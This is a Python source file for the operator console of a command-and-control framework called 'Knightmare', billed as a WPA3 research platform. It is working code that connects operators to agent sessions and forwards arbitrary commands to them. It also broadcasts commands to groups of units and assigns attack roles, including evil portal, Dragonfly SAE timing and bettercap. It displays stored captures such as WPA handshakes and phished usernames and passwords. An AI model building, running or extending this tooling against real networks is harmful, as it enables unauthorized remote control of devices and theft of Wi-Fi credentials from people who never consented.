# c2/operator.py — Knightmare C2 Operator Console
#
# Interactive multi-operator CLI.  Connects to the C2 server operator port,
# lists / interacts with agent sessions, assigns task roles, broadcasts
# commands, and queries the aggregated data store.
#
# Usage:
#   python -m c2.operator --host <c2-ip> --password <password> --name alice

import ssl
import socket
import threading
import cmd
import sys
import time
import os
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from c2 import protocol as proto

BANNER = r"""
██╗  ██╗███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███╗   ███╗ █████╗ ██████╗ ███████╗
██║ ██╔╝████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝████╗ ████║██╔══██╗██╔══██╗██╔════╝
█████╔╝ ██╔██╗ ██║██║██║  ███╗███████║   ██║   ██╔████╔██║███████║██████╔╝█████╗
██╔═██╗ ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██║╚██╔╝██║██╔══██║██╔══██╗██╔══╝
██║  ██╗██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝

  Operator Console — Tengu Edition  |  WPA3 Research Platform
  Type 'help' for commands.
"""


# ---------------------------------------------------------------------------
# Low-level client
# ---------------------------------------------------------------------------

class OperatorClient:
    """Synchronous TLS client with a background recv thread."""

    def __init__(self, host: str, port: int, password: str,
                 name: str, cert: str | None = None):
        self.host     = host
        self.port     = port
        self.password = password
        self.name     = name
        self.cert     = cert
        self._sock    = None
        self._file    = None
        self._wlock   = threading.Lock()

        # Async server-push events (SESSION_NEW/GONE, DATA notifications)
        self._async_msgs: list[dict] = []
        self._async_lock = threading.Lock()

        # Synchronous reply slot
        self._pending:       dict | None = None
        self._pending_type:  str  | None = None
        self._pending_event  = threading.Event()

        # Command output accumulator
        self._cmd_output: list[str] = []
        self._cmd_done               = threading.Event()

        self._running = False

    def _ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        if self.cert:
            ctx.load_verify_locations(self.cert)
            ctx.verify_mode    = ssl.CERT_REQUIRED
            ctx.check_hostname = False
        else:
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
        return ctx

    def connect(self):
        raw        = socket.create_connection((self.host, self.port), timeout=10)
        self._sock = self._ssl_context().wrap_socket(raw, server_hostname=self.host)
        self._file = self._sock.makefile("rb")

    def _write(self, msg_type: str, **data):
        with self._wlock:
            self._sock.sendall(proto.encode(msg_type, **data))

    def handshake(self):
        self._write(proto.AUTH, password=self.password, name=self.name)
        resp = proto.decode(self._file.readline())
        if resp.get("type") != proto.AUTH_OK:
            raise ConnectionRefusedError(resp.get("reason", "Auth failed"))

    # ------------------------------------------------------------------
    # Background recv thread
    # ------------------------------------------------------------------

    _SYNC_TYPES = {
        proto.SESSIONS, proto.OPERATORS,
        proto.INTERACT_OK, proto.INTERACT_FAIL,
        proto.BROADCAST_OK, proto.TASK_ACK, proto.TASKS,
        proto.DATA_RESP,
        proto.ERROR, proto.PONG, proto.DONE,
    }

    def _recv_loop(self):
        while self._running:
            try:
                line = self._file.readline()
                if not line:
                    break
                msg   = proto.decode(line)
                mtype = msg.get("type")

                if mtype == proto.OUTPUT:
                    self._cmd_output.append(msg.get("data", ""))

                elif mtype == proto.DONE:
                    self._cmd_done.set()

                elif mtype in self._SYNC_TYPES:
                    self._pending = msg
                    self._pending_event.set()

                # Server-push events
                elif mtype in (proto.SESSION_NEW, proto.SESSION_GONE,
                               proto.OPERATORS, proto.DATA):
                    with self._async_lock:
                        self._async_msgs.append(msg)

            except Exception:
                break
        self._running = False

    def start_recv(self):
        self._running = True
        threading.Thread(target=self._recv_loop, daemon=True,
                         name="op-recv").start()

    # ------------------------------------------------------------------
    # Request / response
    # ------------------------------------------------------------------

    def _request(self, msg_type: str, timeout: float = 5.0, **data) -> dict:
        self._pending = None
        self._pending_event.clear()
        self._write(msg_type, **data)
        if not self._pending_event.wait(timeout):
            return {"type": proto.ERROR, "reason": "Server response timed out"}
        return self._pending

    def _run_command(self, cmd_str: str, timeout: float = 30.0) -> str:
        self._cmd_output.clear()
        self._cmd_done.clear()
        self._write(proto.COMMAND, cmd=cmd_str, args={})
        self._cmd_done.wait(timeout)
        return "".join(self._cmd_output)

    def drain_async(self) -> list[dict]:
        with self._async_lock:
            msgs, self._async_msgs = self._async_msgs, []
        return msgs

    def disconnect(self):
        self._running = False
        try:
            self._sock.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Operator CLI
# ---------------------------------------------------------------------------

class OperatorCLI(cmd.Cmd):
    intro  = BANNER
    prompt = "knightmare> "

    def __init__(self, client: OperatorClient):
        super().__init__()
        self.client   = client
        self._session = None   # currently interacted session dict

    # ------------------------------------------------------------------
    # Pre-command hook — flush server-push events
    # ------------------------------------------------------------------

    def precmd(self, line):
        for msg in self.client.drain_async():
            mtype = msg.get("type")
            if mtype == proto.SESSION_NEW:
                s = msg.get("session", {})
                print(f"\n[+] Session {s.get('id')} online — "
                      f"{s.get('platform')}@{s.get('hostname')} "
                      f"role={s.get('role','idle')}")
                print(self.prompt, end="", flush=True)
            elif mtype == proto.SESSION_GONE:
                sid = msg.get("session_id")
                print(f"\n[-] Session {sid} disconnected")
                if self._session and self._session.get("id") == sid:
                    self._session = None
                    self.prompt   = "knightmare> "
                    print("[!] Your active session was lost.")
                print(self.prompt, end="", flush=True)
            elif mtype == proto.DATA:
                print(f"\n[data] {msg.get('hostname','?')} → "
                      f"{msg.get('category','?')} +{msg.get('count',0)} records")
                print(self.prompt, end="", flush=True)
        return line

    # ------------------------------------------------------------------
    # Session management
    # ------------------------------------------------------------------

    def do_sessions(self, _):
        """List all active agent sessions."""
        resp = self.client._request(proto.SESSIONS)
        data = resp.get("data", [])
        if not data:
            print("[*] No active sessions.")
            return
        hdr = (f"{'ID':<10} {'PLATFORM':<14} {'HOSTNAME':<22} "
               f"{'USER':<12} {'ROLE':<14} {'CONNECTED':<22} LOCKED BY")
        print(hdr)
        print("─" * len(hdr))
        for s in data:
            print(f"{s['id']:<10} {s['platform']:<14} {s['hostname']:<22} "
                  f"{s['user']:<12} {s.get('role','idle'):<14} "
                  f"{s['connected_at']:<22} {s.get('locked_by') or '—'}")

    def do_operators(self, _):
        """List connected operators."""
        resp = self.client._request(proto.OPERATORS)
        data = resp.get("data", [])
        if not data:
            print("[*] No operators connected.")
            return
        hdr = f"{'ID':<10} {'NAME':<22} {'CONNECTED':<22} SESSION"
        print(hdr)
        print("─" * len(hdr))
        for op in data:
            print(f"{op['id']:<10} {op['name']:<22} "
                  f"{op['connected_at']:<22} {op.get('session_id') or '—'}")

    def do_interact(self, line):
        """interact <session_id>  — lock and interact with a session."""
        sid = line.strip()
        if not sid:
            print("Usage: interact <session_id>")
            return
        resp = self.client._request(proto.INTERACT, session_id=sid)
        if resp.get("type") == proto.INTERACT_OK:
            s = resp["session"]
            self._session = s
            self.prompt   = f"[{s['platform']}:{s['hostname']}]> "
            print(f"[*] Interacting with {s['id']} ({s['platform']}@{s['hostname']}) "
                  f"role={s.get('role','idle')}")
        else:
            print(f"[!] {resp.get('reason', 'Failed.')}")

    def do_background(self, _):
        """Background current session (keep lock)."""
        if not self._session:
            print("[!] No active session.")
            return
        print(f"[*] Backgrounded session {self._session['id']}.")
        self._session = None
        self.prompt   = "knightmare> "

    def do_release(self, _):
        """Release and unlock the current session."""
        if not self._session:
            print("[!] No active session.")
            return
        self.client._request(proto.RELEASE)
        print(f"[*] Released session {self._session['id']}.")
        self._session = None
        self.prompt   = "knightmare> "

    # ------------------------------------------------------------------
    # Task / role assignment
    # ------------------------------------------------------------------

    def do_tasks(self, _):
        """Show current task role for every session."""
        resp = self.client._request(proto.TASKS)
        data = resp.get("data", [])
        if not data:
            print("[*] No sessions.")
            return
        hdr = f"{'SESSION':<10} {'HOSTNAME':<22} {'PLATFORM':<14} ROLE"
        print(hdr)
        print("─" * len(hdr))
        for t in data:
            print(f"{t['session_id']:<10} {t['hostname']:<22} "
                  f"{t['platform']:<14} {t['role']}")
        print(f"\nValid roles: {', '.join(proto.ALL_ROLES)}")

    def do_assign(self, line):
        """assign <session_id> <role> [config_json]  — assign a task role to a unit.

Examples:
  assign A1B2C3D4 kismet
  assign A1B2C3D4 dragonfly {"interface":"wlan1","target_bssid":"AA:BB:CC:DD:EE:FF"}
  assign A1B2C3D4 evil_portal {"ssid":"FreeWifi"}
        """
        parts = line.split(None, 2)
        if len(parts) < 2:
            print("Usage: assign <session_id> <role> [config_json]")
            return
        sid  = parts[0]
        role = parts[1].lower()
        cfg  = {}
        if len(parts) == 3:
            try:
                cfg = json.loads(parts[2])
            except json.JSONDecodeError:
                print("[!] config_json must be valid JSON")
                return
        resp = self.client._request(proto.TASK_ASSIGN,
                                    session_id=sid, role=role, config=cfg)
        if resp.get("type") == proto.TASK_ACK:
            print(f"[*] Role '{role}' assigned to session {sid}.")
        else:
            print(f"[!] {resp.get('reason', 'Assignment failed.')}")

    # ------------------------------------------------------------------
    # Broadcast
    # ------------------------------------------------------------------

    def do_broadcast(self, line):
        """broadcast <filter> <command>  — send a command to multiple sessions.

Filter options:
  all            — every connected agent
  tms            — all TMS units
  knightmare     — all Knightmare agents
  kismet         — all units with role=kismet
  evil_portal    — all units with role=evil_portal
  <session_id>   — single session (same as interact + command)

Examples:
  broadcast tms status
  broadcast all scan network
  broadcast kismet marauder scanap
        """
        parts = line.split(None, 1)
        if len(parts) < 2:
            print("Usage: broadcast <filter> <command>")
            return
        filt    = parts[0]
        cmd_str = parts[1]
        resp = self.client._request(proto.BROADCAST, filter=filt, cmd=cmd_str, timeout=10)
        if resp.get("type") == proto.BROADCAST_OK:
            sent = resp.get("sent_to", [])
            print(f"[*] Broadcast sent to {resp.get('count', 0)} unit(s): {', '.join(sent)}")
        else:
            print(f"[!] {resp.get('reason', 'Broadcast failed.')}")

    # ------------------------------------------------------------------
    # Data store queries
    # ------------------------------------------------------------------

    def do_data(self, line):
        """Query aggregated data from the C2 data store.

Usage:
  data summary                        — record counts by category and unit
  data networks    [session_id]        — SSIDs/BSSIDs seen across all units
  data handshakes  [session_id]        — WPA2/WPA3 handshakes captured
  data sae_timing  [session_id]        — Dragonfly SAE timing measurements
  data portals     [session_id]        — evil portal credential captures
  data bluetooth   [session_id]        — Bluetooth devices seen
  data rf          [session_id]        — RF signals (rtl_433)
  data clients     [session_id]        — WiFi client stations seen
        """
        parts      = line.strip().split()
        if not parts:
            print("Usage: data <category> [session_id]")
            return
        category   = parts[0]
        session_flt= parts[1] if len(parts) > 1 else None

        resp = self.client._request(proto.DATA_QUERY,
                                    category=category,
                                    session_id=session_flt,
                                    limit=500,
                                    timeout=8)
        if resp.get("type") == proto.ERROR:
            print(f"[!] {resp.get('reason')}")
            return

        records = resp.get("records", {})

        if category == "summary":
            if not records:
                print("[*] No data collected yet.")
                return
            print(f"{'CATEGORY':<16} {'TOTAL':>8}   BY UNIT")
            print("─" * 60)
            for cat, info in records.items():
                units = "  ".join(f"{h}={n}" for h, n in info.get("by_unit", {}).items())
                print(f"{cat:<16} {info['total']:>8}   {units}")
            return

        if not records:
            print(f"[*] No {category} data yet.")
            return

        _print_records(category, records)

    # ------------------------------------------------------------------
    # Session command forwarding
    # ------------------------------------------------------------------

    def default(self, line):
        if not self._session:
            print(f"[!] Unknown command: {line}")
            print("[*] Use 'interact <id>' to attach to a session first.")
            return
        output = self.client._run_command(line)
        if output:
            print(output, end="" if output.endswith("\n") else "\n")

    # ------------------------------------------------------------------
    # Exit
    # ------------------------------------------------------------------

    def do_exit(self, _):
        """Exit the operator console."""
        self.client.disconnect()
        print("[*] Disconnected.")
        return True

    def do_EOF(self, line):
        print()
        return self.do_exit(line)

    # ------------------------------------------------------------------
    # Help
    # ------------------------------------------------------------------

    def do_help(self, arg):
        if arg:
            super().do_help(arg)
            return
        print("""
Session management:
  sessions                            — list active agent sessions
  operators                           — list connected operators
  interact <id>                       — lock and interact with a session
  background                          — return to main prompt (session stays locked)
  release                             — unlock current session

Task / role management:
  tasks                               — show role assigned to each unit
  assign <id> <role> [json]           — assign a task role to a unit
    roles: kismet | bettercap | evil_portal | dragonfly | scan | idle

Broadcast:
  broadcast <filter> <command>        — send command to group of units
    filters: all | tms | knightmare | <role> | <session_id>

Data store:
  data summary                        — counts by category and unit
  data networks    [session_id]        — SSIDs / BSSIDs
  data handshakes  [session_id]        — WPA2/WPA3 handshakes
  data sae_timing  [session_id]        — Dragonfly SAE timing data
  data portals     [session_id]        — evil portal captures
  data bluetooth   [session_id]        — Bluetooth devices
  data rf          [session_id]        — RF signals
  data clients     [session_id]        — WiFi client stations

Session commands (when interacting with a Knightmare session):
  list | use <module> | info | show options | set <k> <v>
  connect <device> | devices | run <payload> | icarus <pillar>

Session commands (when interacting with a TMS session):
  drive forward|back|left|right|stop
  marauder <command>
  scan network|wifi|bluetooth|rf
  portscan <target> [flags]
  ping <host> | dns <host> | interfaces | status

  exit                                — disconnect and quit
""")


# ---------------------------------------------------------------------------
# Pretty-print helpers
# ---------------------------------------------------------------------------

def _print_records(category: str, records: list):
    print(f"[*] {len(records)} record(s) — category: {category}\n")

    if category == proto.CAT_NETWORKS:
        print(f"{'SSID':<32} {'BSSID':<20} {'CH':>4} {'SIGNAL':>8} {'ENC':<10} HOSTNAME  TIMESTAMP")
        print("─" * 100)
        for r in records:
            print(f"{r.get('ssid','?'):<32} {r.get('bssid','?'):<20} "
                  f"{str(r.get('channel','?')):>4} {str(r.get('signal','?')):>8} "
                  f"{r.get('encryption','?'):<10} {r.get('hostname','?'):<10} "
                  f"{r.get('timestamp','?')}")

    elif category == proto.CAT_HANDSHAKES:
        print(f"{'BSSID':<20} {'CLIENT':<20} {'TYPE':<8} {'SSID':<24} HOSTNAME  TIMESTAMP")
        print("─" * 100)
        for r in records:
            print(f"{r.get('bssid','?'):<20} {r.get('client','?'):<20} "
                  f"{r.get('type','?'):<8} {r.get('ssid','?'):<24} "
                  f"{r.get('hostname','?'):<10} {r.get('timestamp','?')}")

    elif category == proto.CAT_SAE_TIMING:
        print(f"{'BSSID':<20} {'SCALAR_TIME_US':>16} {'ELEMENT_TIME_US':>16} "
              f"{'GROUP':>6} {'ANOMALY':<8} HOSTNAME  TIMESTAMP")
        print("─" * 100)
        for r in records:
            anomaly = "YES" if r.get("anomaly") else "no"
            print(f"{r.get('bssid','?'):<20} {str(r.get('scalar_time_us','?')):>16} "
                  f"{str(r.get('element_time_us','?')):>16} "
                  f"{str(r.get('group','?')):>6} {anomaly:<8} "
                  f"{r.get('hostname','?'):<10} {r.get('timestamp','?')}")

    elif category == proto.CAT_PORTALS:
        print(f"{'SSID':<24} {'USERNAME':<20} {'PASSWORD':<24} HOSTNAME  TIMESTAMP")
        print("─" * 100)
        for r in records:
            print(f"{r.get('ssid','?'):<24} {r.get('username','?'):<20} "
                  f"{r.get('password','?'):<24} {r.get('hostname','?'):<10} "
                  f"{r.get('timestamp','?')}")

    elif category == proto.CAT_BLUETOOTH:
        print(f"{'MAC':<20} {'NAME':<28} {'RSSI':>6} HOSTNAME  TIMESTAMP")
        print("─" * 80)
        for r in records:
            print(f"{r.get('mac','?'):<20} {r.get('name','?'):<28} "
                  f"{str(r.get('rssi','?')):>6} {r.get('hostname','?'):<10} "
                  f"{r.get('timestamp','?')}")

    elif category == proto.CAT_CLIENTS:
        print(f"{'CLIENT MAC':<20} {'BSSID':<20} {'SSID':<24} {'SIGNAL':>8} HOSTNAME  TIMESTAMP")
        print("─" * 100)
        for r in records:
            print(f"{r.get('mac','?'):<20} {r.get('bssid','?'):<20} "
                  f"{r.get('ssid','?'):<24} {str(r.get('signal','?')):>8} "
                  f"{r.get('hostname','?'):<10} {r.get('timestamp','?')}")

    else:
        # Generic fallback
        for r in records:
            print(json.dumps(r))


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Knightmare C2 Operator Console")
    parser.add_argument("--host",     default="127.0.0.1")
    parser.add_argument("--port",     type=int, default=proto.OPERATOR_PORT, metavar="PORT")
    parser.add_argument("--password", required=True)
    parser.add_argument("--name",     default="operator")
    parser.add_argument("--cert",     default=None, help="Path to server.crt")
    args = parser.parse_args()

    client = OperatorClient(args.host, args.port, args.password, args.name, args.cert)
    print(f"[*] Connecting to {args.host}:{args.port}…")
    try:
        client.connect()
        client.handshake()
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    client.start_recv()
    print(f"[+] Connected as '{args.name}'")

    cli = OperatorCLI(client)
    try:
        cli.cmdloop()
    except KeyboardInterrupt:
        print()
        client.disconnect()


if __name__ == "__main__":
    main()
